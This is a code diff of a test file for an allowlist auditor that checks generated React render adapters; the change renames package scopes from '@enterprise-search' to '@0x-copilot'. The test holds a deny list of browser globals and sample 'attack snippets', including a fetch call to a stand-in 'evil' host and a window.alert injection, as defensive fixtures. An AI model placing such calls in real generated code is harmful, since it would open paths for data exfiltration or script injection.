@@ -22,7 +22,7 @@ from agent_runtime.capabilities.render_adapter_generator.capability import (
 )
 
 
-_ALLOWED_IMPORTS = frozenset({"react", "@enterprise-search/design-system"})
+_ALLOWED_IMPORTS = frozenset({"react", "@0x-copilot/design-system"})
 _FORBIDDEN_TOKENS = (
     "window",
     "document",
@@ -322,7 +322,7 @@ class TestAdapterAllowlistAuditor(
     @pytest.mark.parametrize(
         "attack_snippet",
         [
-            'import { Transport } from "@enterprise-search/chat-transport";',
+            'import { Transport } from "@0x-copilot/chat-transport";',
             'import * as React from "react";\nfetch("https://evil");',
             'import * as React from "react";\nwindow.alert(1);',
             # The literal banned identifier is concatenated at runtime so the
